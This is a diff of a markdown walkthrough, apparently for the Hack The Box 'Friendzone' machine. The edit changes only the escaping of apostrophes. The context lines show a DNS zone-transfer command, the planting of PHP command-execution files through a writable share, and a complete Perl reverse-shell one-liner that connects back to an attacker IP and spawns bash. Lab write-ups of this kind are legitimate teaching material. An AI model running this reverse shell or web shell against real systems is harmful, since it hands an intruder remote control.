@@ -187,7 +187,7 @@ Awesome. Experience tells me I should put those subdomains into `/etc/hosts`.
 # echo -e "10.10.10.123\t$(host -l friendzoneportal.red 10.10.10.123 | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
 ```
 
-But, wait. There\'s another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.
+But, wait. There's another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.
 
 <a class="image-popup">
 ![569e34c9.png](/assets/images/posts/friendzone-htb-walkthrough/569e34c9.png)
@@ -267,7 +267,7 @@ See? You are never going to upload anything.
 ?>
 ```
 
-Recall that I was able to write to `Directory`? Let\'s write a small PHP file to prove that we are able to run PHP code.
+Recall that I was able to write to `Directory`? Let's write a small PHP file to prove that we are able to run PHP code.
 
 <div class="filename"><span>info.php</span></div>
 
@@ -281,7 +281,7 @@ In the shares comment, `Files` was shown to be mapped to `/etc/Files`. By extens
 ![dfab6015.png](/assets/images/posts/friendzone-htb-walkthrough/dfab6015.png)
 </a>
 
-Awesome. Now, let\'s step up the game and write another small PHP file, that allows us to execute remote commands.
+Awesome. Now, let's step up the game and write another small PHP file, that allows us to execute remote commands.
 
 <div class="filename"><span>cmd.php</span></div>
 
@@ -297,13 +297,13 @@ Sweet. Time to get ourselves a Perl reverse shell.
 
 ## Low-Privilege Shell
 
-Here\'s the Perl one-liner I use.
+Here's the Perl one-liner I use.
 
 ```
 perl -e 'use Socket;$i="10.10.12.246";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-Of course, it\'s best to `urlencode` it to prevent complications in the browser's address bar.
+Of course, it's best to `urlencode` it to prevent complications in the browser's address bar.
 
 <a class="image-popup">
 ![14648ca0.png](/assets/images/posts/friendzone-htb-walkthrough/14648ca0.png)
